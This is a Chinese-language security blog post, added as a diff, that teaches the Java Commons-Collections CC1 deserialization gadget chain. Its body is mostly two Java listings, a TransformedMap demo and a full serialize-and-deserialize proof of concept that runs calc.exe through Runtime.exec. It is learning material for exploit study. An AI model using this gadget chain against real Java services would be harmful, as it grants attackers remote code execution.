@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="跟着p神学java，循序渐进地来。 TransformedMap版cc1的大致调用原理：先简单说一下cc1的原理，用Transformer的一系列派生类组成一组修饰器（放恶意代码），再用TransformedMap.decorate()去修饰一个Map得到一个修饰好的Map，只要往这个修饰好的Map里添加数据就会触发回调（执行恶意代码）。 TransformedMap版cc1简化链demo（p牛独">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全漫谈之CC链篇">
+<meta property="og:url" content="http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="跟着p神学java，循序渐进地来。 TransformedMap版cc1的大致调用原理：先简单说一下cc1的原理，用Transformer的一系列派生类组成一组修饰器（放恶意代码），再用TransformedMap.decorate()去修饰一个Map得到一个修饰好的Map，只要往这个修饰好的Map里添加数据就会触发回调（执行恶意代码）。 TransformedMap版cc1简化链demo（p牛独">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-12-19T11:03:37.000Z">
+<meta property="article:modified_time" content="2024-12-19T12:29:39.005Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>JAVA安全漫谈之CC链篇</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/16/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&text=JAVA安全漫谈之CC链篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&is_video=false&description=JAVA安全漫谈之CC链篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA安全漫谈之CC链篇&body=Check out this article: http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&name=JAVA安全漫谈之CC链篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&t=JAVA安全漫谈之CC链篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88cc1%E7%9A%84%E5%A4%A7%E8%87%B4%E8%B0%83%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">TransformedMap版cc1的大致调用原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88cc1%E7%AE%80%E5%8C%96%E9%93%BEdemo%EF%BC%88p%E7%89%9B%E7%8B%AC%E5%88%9B%EF%BC%89%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">TransformedMap版cc1简化链demo（p牛独创）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8TransformedMap%E7%BC%96%E5%86%99%E7%9C%9F%E6%AD%A3%E7%9A%84POC"><span class="toc-number">3.</span> <span class="toc-text">用TransformedMap编写真正的POC</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        JAVA安全漫谈之CC链篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-19T11:03:37.000Z" class="dt-published" itemprop="datePublished">2024-12-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>跟着p神学java，循序渐进地来。</p>
+<h3 id="TransformedMap版cc1的大致调用原理："><a href="#TransformedMap版cc1的大致调用原理：" class="headerlink" title="TransformedMap版cc1的大致调用原理："></a>TransformedMap版cc1的大致调用原理：</h3><p>先简单说一下cc1的原理，用Transformer的一系列派生类组成一组修饰器（放恶意代码），再用TransformedMap.decorate()去修饰一个Map得到一个修饰好的Map，只要往这个修饰好的Map里添加数据就会触发回调（执行恶意代码）。</p>
+<h3 id="TransformedMap版cc1简化链demo（p牛独创）："><a href="#TransformedMap版cc1简化链demo（p牛独创）：" class="headerlink" title="TransformedMap版cc1简化链demo（p牛独创）："></a>TransformedMap版cc1简化链demo（p牛独创）：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pithi0n__cc1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>部分代码解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>1、TransformedMap.decorate()的作用是对Map（java标准数据结构）做一个修饰，如这句代码就是对innerMap做一个修饰，传出的outerMap即为修饰后的Map，被修饰过的Map在添加新的元素时，会执⾏⼀个回调（即执行恶意方法）。</p>
+<p>2、这句代码和innerMap并无太大关系。这行代码实际上并不会改变innerMap中存储的键值对内容，它只是为innerMap创建了有一个新的包装器outerMap，这个包装器会在你访问outerMap时，应用transformerChain中定义的转换逻辑。</p>
+<h3 id="用TransformedMap编写真正的POC"><a href="#用TransformedMap编写真正的POC" class="headerlink" title="用TransformedMap编写真正的POC"></a>用TransformedMap编写真正的POC</h3><p>我们前面说过，触发这个漏洞的核心，在于向Map中加入一个新的元素。在demo中，我们可以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pithi0n__cc1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span> &#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化操作的代码</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line">            System.out.println(barr);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88cc1%E7%9A%84%E5%A4%A7%E8%87%B4%E8%B0%83%E7%94%A8%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">TransformedMap版cc1的大致调用原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88cc1%E7%AE%80%E5%8C%96%E9%93%BEdemo%EF%BC%88p%E7%89%9B%E7%8B%AC%E5%88%9B%EF%BC%89%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">TransformedMap版cc1简化链demo（p牛独创）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8TransformedMap%E7%BC%96%E5%86%99%E7%9C%9F%E6%AD%A3%E7%9A%84POC"><span class="toc-number">3.</span> <span class="toc-text">用TransformedMap编写真正的POC</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&text=JAVA安全漫谈之CC链篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&is_video=false&description=JAVA安全漫谈之CC链篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA安全漫谈之CC链篇&body=Check out this article: http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&title=JAVA安全漫谈之CC链篇"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&name=JAVA安全漫谈之CC链篇&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/12/19/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E4%B9%8BCC%E9%93%BE%E7%AF%87/&t=JAVA安全漫谈之CC链篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
